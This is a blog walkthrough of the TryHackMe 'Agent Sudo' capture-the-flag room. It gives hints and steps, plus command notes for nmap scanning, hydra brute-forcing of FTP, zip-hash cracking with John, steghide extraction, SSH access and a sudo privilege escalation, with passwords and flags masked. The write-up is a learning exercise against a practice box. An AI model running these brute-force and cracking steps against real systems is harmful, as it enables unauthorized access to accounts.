<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Agent Sudo TryHackMe Walkthrough | Mr Ash Co</title>
<meta name=keywords content="TryHackMe,Capture The Flag,Walkthrough"><meta name=description content="Welcome back to another TryHackMe room, the challenge today is Agent Sudo.
No spoilers below within the hints, just some good ol’ fashion hints to help you out on your agent sudo journey. For more detail, with some spoilers, see the steps section, and for everything I did, see my notes. If you prefer a video walkthrough, well that’s linked below, and if you want my personal thoughts on the room, check out the reflection via the video."><meta name=author content="Mr Ash"><link rel=canonical href=//localhost:1313/agent-sudo/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.5591f0f0e6da962274ad39d968be1ca571fe1593fa5f642efac68ccea21a574f.css integrity="sha256-VZHw8ObaliJ0rTnZaL4cpXH+FZP6X2Qu+saMzqIaV08=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.acb54fd32bbc1982428b8850317e45d076b95012730a5936667e6bc21777692a.js integrity="sha256-rLVP0yu8GYJCi4hQMX5F0Ha5UBJzClk2Zn5rwhd3aSo=" onload=hljs.initHighlightingOnLoad()></script><link rel=icon href="https://p146.p4.n0.cdn.getcloudapp.com/items/Jrum0N6q/4ab8cbb7-d222-4c3c-963d-f0ec6c30568c.jpg?source=viewer&amp;v=db94595858aad20b777e4f130cbe5006"><link rel=icon type=image/png sizes=16x16 href=//localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=//localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=//localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=//localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=//localhost:1313/agent-sudo/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Agent Sudo TryHackMe Walkthrough"><meta property="og:description" content="Welcome back to another TryHackMe room, the challenge today is Agent Sudo.
No spoilers below within the hints, just some good ol’ fashion hints to help you out on your agent sudo journey. For more detail, with some spoilers, see the steps section, and for everything I did, see my notes. If you prefer a video walkthrough, well that’s linked below, and if you want my personal thoughts on the room, check out the reflection via the video."><meta property="og:type" content="article"><meta property="og:url" content="//localhost:1313/agent-sudo/"><meta property="og:image" content="https://p146.p4.n0.cdn.getcloudapp.com/items/WnuDq4KN/00cd5204-7161-4728-ae1b-8552248e9747.jpg?v=40fdd0801164d7a95b5a5487f11cf83b"><meta property="article:section" content="post"><meta property="article:published_time" content="2022-07-09T00:00:00+00:00"><meta property="article:modified_time" content="2022-07-09T00:00:00+00:00"><meta property="og:site_name" content="Mr Ash Co"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://p146.p4.n0.cdn.getcloudapp.com/items/WnuDq4KN/00cd5204-7161-4728-ae1b-8552248e9747.jpg?v=40fdd0801164d7a95b5a5487f11cf83b"><meta name=twitter:title content="Agent Sudo TryHackMe Walkthrough"><meta name=twitter:description content="Welcome back to another TryHackMe room, the challenge today is Agent Sudo.
No spoilers below within the hints, just some good ol’ fashion hints to help you out on your agent sudo journey. For more detail, with some spoilers, see the steps section, and for everything I did, see my notes. If you prefer a video walkthrough, well that’s linked below, and if you want my personal thoughts on the room, check out the reflection via the video."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"//localhost:1313/post/"},{"@type":"ListItem","position":2,"name":"Agent Sudo TryHackMe Walkthrough","item":"//localhost:1313/agent-sudo/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Agent Sudo TryHackMe Walkthrough","name":"Agent Sudo TryHackMe Walkthrough","description":"Welcome back to another TryHackMe room, the challenge today is Agent Sudo.\nNo spoilers below within the hints, just some good ol’ fashion hints to help you out on your agent sudo journey. For more detail, with some spoilers, see the steps section, and for everything I did, see my notes. If you prefer a video walkthrough, well that’s linked below, and if you want my personal thoughts on the room, check out the reflection via the video.","keywords":["TryHackMe","Capture The Flag","Walkthrough"],"articleBody":"Welcome back to another TryHackMe room, the challenge today is Agent Sudo.\nNo spoilers below within the hints, just some good ol’ fashion hints to help you out on your agent sudo journey. For more detail, with some spoilers, see the steps section, and for everything I did, see my notes. If you prefer a video walkthrough, well that’s linked below, and if you want my personal thoughts on the room, check out the reflection via the video.\nDisclaimer, there are spoilers for this room below, please use the hints if you do not want any steps spoiled. Room creator credit: DesKel.\nHints Task 2 Enumerate\nHow many open ports? nmap can show you. How you redirect yourself to a secret page? Read the note on index.html What is the agent name? Use the web dev tools to change user-***** Task 3 Hash cracking and brute-force\nFTP password. Use hydra with rockyou.txt Zip file password. Use binwalk to really see the png, then zip2jon. steg password. Use steghide to really see the jpg. Who is the other agent (in full name)? cat your new message.txt SSH password. base64 -d Task 4 Capture the user flag\nWhat is the user flag? Once in, simple cat What is the incident of the photo called? Use OSINT via bing. Task 5 Privilege escalation CVE number for the escalation. sudo -* What is the root flag? cat /root/root.txt (Bonus) Who is Agent R? see root.txt Steps Task 2 Enumerate, as always, start by scanning the machine, I used nmap -vv -A . We can see ports 21, 22 and 80, so most likely we have a web server running, let’s confirm this. Visithttp:// to get the next clue, change the user-agent by going to Inspect (DevTools) \u003e Customise and control DevTools \u003e More Tools \u003e Network conditions, User agent. Here you can change the user-agent by disabling/unchecking Use browser default. Reload the page, and you’re done! Task 3 Hash cracking and brute-force. Now that leads us back to port 21, ftp, so now armed with a username, let’s use brute force. Use hydra -t 32 -l ***** -P /usr/share/wordlists/rockyou.txt -vV ftp against the target and you’ll be able to find the password, so then log in using ftp , and mget * to copy all the files. It’s time to examine what we’ve found, run file * to show some basic info, but use binwalk to show hidden info within the files. Then binwalk -e cutie.png to pull out the data, again running file * will help here with new files. Use zip2john 8702.zip \u003e 8702.hashes to extract the hash, then john 8702.hashes to crack it. The new text file provides a cryptic message, we can decode this using echo ******** | base64 -d. That’s the steg password, use steghide extract -sf cute-alien.jpg -p ****** to gain SSH creds, then ssh *****@. Next up, Task 4 Capture the user flag. Now copy the files over via scp -r * *****@: ., use a bit of OSINT and find the CVE. For more, use my notes below or hints above for help, enjoy! Notes nmap: nmap -vv -A Completed NSE at 02:52, 0.00s elapsed Nmap scan report for 10.10.253.182 Host is up, received conn-refused (0.32s latency). Scanned at 2022-07-06 02:51:25 EDT for 42s Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 3.0.3 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5hdrxDB30IcSGobuBxhwKJ8g+DJcUO5xzoaZP/vJBtWoSf4nWDqaqlJdEF0Vu7Sw7i0R3aHRKGc5mKmjRuhSEtuKKjKdZqzL3xNTI2cItmyKsMgZz+lbMnc3DouIHqlh748nQknD/28+RXREsNtQZtd0VmBZcY1TD0U4XJXPiwleilnsbwWA7pg26cAv9B7CcaqvMgldjSTdkT1QNgrx51g4IFxtMIFGeJDh2oJkfPcX6KDcYo6c9W1l+SCSivAQsJ1dXgA2bLFkG/wPaJaBgCzb8IOZOfxQjnIqBdUNFQPlwshX/nq26BMhNGKMENXJUpvUTshoJ/rFGgZ9Nj31r | 256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHdSVnnzMMv6VBLmga/Wpb94C9M2nOXyu36FCwzHtLB4S4lGXa2LzB5jqnAQa0ihI6IDtQUimgvooZCLNl6ob68= | 256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOL3wRjJ5kmGs/hI4aXEwEndh81Pm/fvo8EvcpDHR5nt Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 02:52 Completed NSE at 02:52, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 02:52 Completed NSE at 02:52, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 02:52 Completed NSE at 02:52, 0.00s elapsed Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at . Nmap done: 1 IP address (1 host up) scanned in 42.85 seconds Visit: http:// Changed User-Agent [Link], redirected: http:///agent_C_attention.php, Found name Agent C.\nAttention *****, Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! From, Agent R Crack FTP: hydra -t 32 -l ***** -P /usr/share/wordlists/rockyou.txt -vV ftp [LINK]\n[21][ftp] host: login: ***** ****password: ***** Logged into FTP ftp , ran mget * to get all the files.\nExamine images: binwalk, extracted image data: binwalk -e cutie.png.\nInstalled sudo apt install 7zip [Link, Link] 7z e 365.zlib.\nCracking zip file [Link]: zip2john 8702.zip \u003e 8702.hashes, john 8702.hashes\nUsing default input encoding: UTF-8 Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x]) Cost 1 (HMAC size) is 78 for all loaded hashes Will run 4 OpenMP threads Proceeding with single, rules:Single Press 'q' or Ctrl-C to abort, almost any other key for status Almost done: Processing the remaining buffered candidate passwords, if any. Proceeding with wordlist:/usr/share/john/password.lst ***** ****(8702.zip/To_agentR.txt) 1g 0:00:00:00 DONE 2/3 (2022-07-08 01:35) 2.222g/s 101044p/s 101044c/s 101044C/s 123456..ferrises Use the \"--show\" option to display all of the cracked passwords reliably Session completed. cat To_agentR.txt\nAgent C, We need to send the picture to **'********'** as soon as possible! By, Agent R Finding hash value: echo ******** | base64 -d, steghide extract -sf cute-alien.jpg -p ******.\nHi *****, Glad you find this message. Your login password is **************** Don't ask me why the password look cheesy, ask agent R who set this password for you. Your buddy, ***** Connect via SSH: ssh *****@, copy over image: scp -r * *****@: . [Link, Link].\nRan sudo -*, searched ‘exploit sudo ************’, found exploit sudo ***** *********\nTo Mr.hacker, Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. Your flag is ******************************** By, ****** a.k.a Agent R This is day 54 of #100DaysOfHacking on my Hackers Learning Path. Subscribe for CyberSec updates or read more, happy hacking, coding, and ‘learning.\n","wordCount":"1019","inLanguage":"en","image":"https://p146.p4.n0.cdn.getcloudapp.com/items/WnuDq4KN/00cd5204-7161-4728-ae1b-8552248e9747.jpg?v=40fdd0801164d7a95b5a5487f11cf83b","datePublished":"2022-07-09T00:00:00Z","dateModified":"2022-07-09T00:00:00Z","author":{"@type":"Person","name":"Mr Ash"},"mainEntityOfPage":{"@type":"WebPage","@id":"//localhost:1313/agent-sudo/"},"publisher":{"@type":"Organization","name":"Mr Ash Co","logo":{"@type":"ImageObject","url":"https://p146.p4.n0.cdn.getcloudapp.com/items/Jrum0N6q/4ab8cbb7-d222-4c3c-963d-f0ec6c30568c.jpg?source=viewer\u0026v=db94595858aad20b777e4f130cbe5006"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=//localhost:1313/ accesskey=h title="mrashco (Alt + H)">mrashco</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=//localhost:1313/now title=now><span>now</span></a></li><li><a href=//localhost:1313/blog title=blog><span>blog</span></a></li><li><a href=//localhost:1313/letter title=letters><span>letters</span></a></li><li><a href=//localhost:1313/search title=" (Alt + /)" accesskey=/><span><svg xmlns="http://www.w3.org/2000/svg" width="17.5" height="17.5" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg></span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=//localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=//localhost:1313/post/>Posts</a></div><h1 class=post-title>Agent Sudo TryHackMe Walkthrough</h1><div class=post-meta><span title='2022-07-09 00:00:00 +0000 UTC'>09/07/2022</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;1019 words&nbsp;·&nbsp;Mr Ash&nbsp;|&nbsp;<a href=https://github.com/mrashco/mrash.co/tree/main/content/post/2022/agent-sudo.md rel="noopener noreferrer" target=_blank>Suggest Edits</a></div></header><figure class=entry-cover><img loading=lazy src="https://p146.p4.n0.cdn.getcloudapp.com/items/WnuDq4KN/00cd5204-7161-4728-ae1b-8552248e9747.jpg?v=40fdd0801164d7a95b5a5487f11cf83b" alt></figure><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#hints>Hints</a></li><li><a href=#task-5-privilege-escalation>Task 5 Privilege escalation</a></li><li><a href=#steps>Steps</a></li><li><a href=#notes>Notes</a></li></ul></nav></div></details></div><div class=post-content><p>Welcome back to another <a href=https://tryhackme.com/>TryHackMe</a> room, the challenge today is <a href=https://tryhackme.com/room/agentsudoctf>Agent Sudo</a>.</p><p>No spoilers below within the hints, just some good ol’ fashion hints to help you out on your agent sudo journey. For more detail, with some spoilers, see the steps section, and for everything I did, see my notes. If you prefer a video walkthrough, well that’s linked below, and if you want my personal thoughts on the room, check out the reflection via the video.</p><p><em>Disclaimer, there are spoilers for this room below, please use the hints if you do not want any steps spoiled. Room creator credit: <a href=https://tryhackme.com/p/DesKel>DesKel</a>.</em></p><h2 id=hints>Hints<a hidden class=anchor aria-hidden=true href=#hints>#</a></h2><p>Task 2 Enumerate</p><ul><li>How many open ports? <code>nmap</code> can show you.</li><li>How you redirect yourself to a secret page? Read the note on <code>index.html</code></li><li>What is the agent name? Use the web dev tools to change <code>user-*****</code></li></ul><p>Task 3 Hash cracking and brute-force</p><ul><li>FTP password. Use <code>hydra</code> with <code>rockyou.txt</code></li><li>Zip file password. Use <code>binwalk</code> to <em>really</em> see the <code>png</code>, then <code>zip2jon</code>.</li><li>steg password. Use <code>steghide</code> to <em>really</em> see the <code>jpg</code>.</li><li>Who is the other agent (in full name)? <code>cat</code> your new <code>message.txt</code></li><li>SSH password. <code>base64 -d</code></li></ul><p>Task 4 Capture the user flag</p><ul><li>What is the user flag? Once in, simple <code>cat</code></li><li>What is the incident of the photo called? Use OSINT via bing.</li></ul><h2 id=task-5-privilege-escalation>Task 5 Privilege escalation<a hidden class=anchor aria-hidden=true href=#task-5-privilege-escalation>#</a></h2><ul><li>CVE number for the escalation. <code>sudo -*</code></li><li>What is the root flag? <code>cat /root/root.txt</code></li><li>(Bonus) Who is Agent R? see <code>root.txt</code></li></ul><h2 id=steps>Steps<a hidden class=anchor aria-hidden=true href=#steps>#</a></h2><ol><li>Task 2 Enumerate, as always, start by scanning the machine, I used <code>nmap -vv -A &lt;ip></code>. We can see ports 21, 22 and 80, so most likely we have a web server running, let’s confirm this.</li><li>Visithttp://&lt;ip> to get the next clue, change the user-agent by going to Inspect (DevTools) > Customise and control DevTools > More Tools > Network conditions, User agent. Here you can change the user-agent by disabling/unchecking Use browser default. Reload the page, and you’re done!</li><li>Task 3 Hash cracking and brute-force. Now that leads us back to port 21, ftp, so now armed with a username, let’s use brute force. Use hydra -t 32 -l ***** -P /usr/share/wordlists/rockyou.txt -vV &lt;ip> ftp against the target and you’ll be able to find the password, so then log in using ftp &lt;ip>, and mget * to copy all the files.</li><li>It’s time to examine what we’ve found, run file * to show some basic info, but use binwalk to show hidden info within the files. Then binwalk -e cutie.png to pull out the data, again running file * will help here with new files. Use zip2john 8702.zip > 8702.hashes to extract the hash, then john 8702.hashes to crack it.</li><li>The new text file provides a cryptic message, we can decode this using echo ******** | base64 -d. That’s the steg password, use <code>steghide extract -sf cute-alien.jpg -p ******</code> to gain SSH creds, then <code>ssh *****@&lt;ip></code>. Next up, Task 4 Capture the user flag.</li><li>Now copy the files over via <code>scp -r * *****@&lt;ip>: .</code>, use a bit of OSINT and find the CVE. For more, use my notes below or hints above for help, enjoy!</li></ol><h2 id=notes>Notes<a hidden class=anchor aria-hidden=true href=#notes>#</a></h2><p>nmap: <code>nmap -vv -A &lt;ip></code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Completed NSE at 02:52, 0.00s elapsed
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.253.182
</span></span><span class=line><span class=cl>Host is up, received conn-refused <span class=o>(</span>0.32s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Scanned at 2022-07-06 02:51:25 EDT <span class=k>for</span> 42s
</span></span><span class=line><span class=cl>Not shown: <span class=m>998</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE REASON  VERSION
</span></span><span class=line><span class=cl>21/tcp open  ftp     syn-ack vsftpd 3.0.3
</span></span><span class=line><span class=cl>22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5hdrxDB30IcSGobuBxhwKJ8g+DJcUO5xzoaZP/vJBtWoSf4nWDqaqlJdEF0Vu7Sw7i0R3aHRKGc5mKmjRuhSEtuKKjKdZqzL3xNTI2cItmyKsMgZz+lbMnc3DouIHqlh748nQknD/28+RXREsNtQZtd0VmBZcY1TD0U4XJXPiwleilnsbwWA7pg26cAv9B7CcaqvMgldjSTdkT1QNgrx51g4IFxtMIFGeJDh2oJkfPcX6KDcYo6c9W1l+SCSivAQsJ1dXgA2bLFkG/wPaJaBgCzb8IOZOfxQjnIqBdUNFQPlwshX/nq26BMhNGKMENXJUpvUTshoJ/rFGgZ9Nj31r
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHdSVnnzMMv6VBLmga/Wpb94C9M2nOXyu36FCwzHtLB4S4lGXa2LzB5jqnAQa0ihI6IDtQUimgvooZCLNl6ob68<span class=o>=</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOL3wRjJ5kmGs/hI4aXEwEndh81Pm/fvo8EvcpDHR5nt
</span></span><span class=line><span class=cl>Service Info: OSs: Unix, Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>NSE: Script Post-scanning.
</span></span><span class=line><span class=cl>NSE: Starting runlevel <span class=m>1</span> <span class=o>(</span>of 3<span class=o>)</span> scan.
</span></span><span class=line><span class=cl>Initiating NSE at 02:52
</span></span><span class=line><span class=cl>Completed NSE at 02:52, 0.00s elapsed
</span></span><span class=line><span class=cl>NSE: Starting runlevel <span class=m>2</span> <span class=o>(</span>of 3<span class=o>)</span> scan.
</span></span><span class=line><span class=cl>Initiating NSE at 02:52
</span></span><span class=line><span class=cl>Completed NSE at 02:52, 0.00s elapsed
</span></span><span class=line><span class=cl>NSE: Starting runlevel <span class=m>3</span> <span class=o>(</span>of 3<span class=o>)</span> scan.
</span></span><span class=line><span class=cl>Initiating NSE at 02:52
</span></span><span class=line><span class=cl>Completed NSE at 02:52, 0.00s elapsed
</span></span><span class=line><span class=cl>Read data files from: /usr/bin/../share/nmap
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 42.85 seconds
</span></span></code></pre></div><p>Visit: <code>http://&lt;ip></code> Changed User-Agent [<a href=https://www.searchenginejournal.com/change-user-agent/368448/>Link</a>], redirected: <code>http://&lt;ip>/agent_C_attention.php</code>, Found name Agent C.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Attention *****,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>From,
</span></span><span class=line><span class=cl>Agent R
</span></span></code></pre></div><p>Crack FTP: <code>hydra -t 32 -l ***** -P /usr/share/wordlists/rockyou.txt -vV &lt;ip> ftp</code> [<a href=https://www.binarytides.com/crack-ftp-passwords-with-thc-hydra-tutorial/>LINK</a>]</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>21<span class=o>][</span>ftp<span class=o>]</span> host: &lt;ip&gt;  login: *****   ****password: *****
</span></span></code></pre></div><p>Logged into FTP <code>ftp &lt;ip></code>, ran <code>mget *</code> to get all the files.</p><p>Examine images: <code>binwalk</code>, extracted image data: <code>binwalk -e cutie.png</code>.</p><p>Installed <code>sudo apt install 7zip</code> [<a href="https://ubuntuforums.org/showthread.php?t=1416364">Link</a>, <a href=https://super-unix.com/ubuntu/ubuntu-extracting-zip-file-fails-giving-error-need-pk-compat-v5-1/>Link</a>] <code>7z e 365.zlib</code>.</p><p>Cracking zip file [<a href=https://dfir.science/2014/07/how-to-cracking-zip-and-rar-protected.html>Link</a>]: <code>zip2john 8702.zip > 8702.hashes</code>, <code>john 8702.hashes</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Using default input encoding: UTF-8
</span></span><span class=line><span class=cl>Loaded <span class=m>1</span> password <span class=nb>hash</span> <span class=o>(</span>ZIP, WinZip <span class=o>[</span>PBKDF2-SHA1 256/256 AVX2 8x<span class=o>])</span>
</span></span><span class=line><span class=cl>Cost <span class=m>1</span> <span class=o>(</span>HMAC size<span class=o>)</span> is <span class=m>78</span> <span class=k>for</span> all loaded hashes
</span></span><span class=line><span class=cl>Will run <span class=m>4</span> OpenMP threads
</span></span><span class=line><span class=cl>Proceeding with single, rules:Single
</span></span><span class=line><span class=cl>Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class=k>for</span> status
</span></span><span class=line><span class=cl>Almost <span class=k>done</span>: Processing the remaining buffered candidate passwords, <span class=k>if</span> any.
</span></span><span class=line><span class=cl>Proceeding with wordlist:/usr/share/john/password.lst
</span></span><span class=line><span class=cl>*****            ****<span class=o>(</span>8702.zip/To_agentR.txt<span class=o>)</span>     
</span></span><span class=line><span class=cl>1g 0:00:00:00 DONE 2/3 <span class=o>(</span>2022-07-08 01:35<span class=o>)</span> 2.222g/s 101044p/s 101044c/s 101044C/s 123456..ferrises
</span></span><span class=line><span class=cl>Use the <span class=s2>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span class=line><span class=cl>Session completed.
</span></span></code></pre></div><p><code>cat To_agentR.txt</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Agent C,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>We need to send the picture to **<span class=s1>&#39;********&#39;</span>** as soon as possible!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>By,
</span></span><span class=line><span class=cl>Agent R
</span></span></code></pre></div><p>Finding hash value: <code>echo ******** | base64 -d</code>, <code>steghide extract -sf cute-alien.jpg -p ******</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Hi *****,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Glad you find this message. Your login password is ****************
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Don<span class=err>&#39;</span>t ask me why the password look cheesy, ask agent R who <span class=nb>set</span> this password <span class=k>for</span> you.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Your buddy,
</span></span><span class=line><span class=cl>*****
</span></span></code></pre></div><p>Connect via SSH: <code>ssh *****@&lt;ip></code>, copy over image: <code>scp -r * *****@&lt;ip>: .</code> [<a href=https://youtu.be/gGe1cNgfHwE>Link</a>, <a href=https://www.freecodecamp.org/news/scp-linux-command-example-how-to-ssh-file-transfer-from-remote-to-local/>Link</a>].</p><p>Ran <code>sudo -*</code>, searched ‘exploit sudo ************’, found exploit <code>sudo ***** *********</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>To Mr.hacker,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Congratulation on rooting this box. This box was designed <span class=k>for</span> TryHackMe. Tips, always update your machine. 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Your flag is 
</span></span><span class=line><span class=cl>********************************
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>By,
</span></span><span class=line><span class=cl>****** a.k.a Agent R
</span></span></code></pre></div><div style=position:relative;padding-bottom:56.25%;height:0;overflow:hidden><iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen loading=eager referrerpolicy=strict-origin-when-cross-origin src="https://www.youtube.com/embed/PYQ51M8qTbw?autoplay=0&controls=1&end=0&loop=0&mute=0&start=0" style=position:absolute;top:0;left:0;width:100%;height:100%;border:0 title="YouTube video"></iframe></div><p>This is day 54 of <a href=https://mrashleyball.com/100daysofhacking/>#100DaysOfHacking</a> on my <a href=https://mrashleyball.com/learning-path-for-beginner-hacker/>Hackers Learning Path</a>. <a href=https://go.mrash.co/newsletter>Subscribe</a> for <a href=https://mrashleyball.com/starting-out-in-cyber-security/>CyberSec</a> updates or <a href=https://mrashleyball.com/blog>read</a> more, happy hacking, coding, and ‘learning.</p><br><div class=gist-embed-form data-form-type=embedded data-form-id=1489913 data-workspace-id=aw3xhcat version=3></div><script type=text/javascript src=https://forms-widget.getgist.com/ defer></script></div><footer class=post-footer><ul class=post-tags><li><a href=//localhost:1313/tags/tryhackme/>TryHackMe</a></li><li><a href=//localhost:1313/tags/capture-the-flag/>Capture the Flag</a></li><li><a href=//localhost:1313/tags/walkthrough/>Walkthrough</a></li></ul><nav class=paginav><a class=prev href=//localhost:1313/cs50-python-problem-set-guide/><span class=title>« Prev</span><br><span>CS50P Problem Set Guide</span>
</a><a class=next href=//localhost:1313/simplectf/><span class=title>Next »</span><br><span>THM SimpleCTF Hints, Writeup and Notes</span></a></nav></footer></article></main><footer class=footer><span>Made with ♥ from Australia</span> •
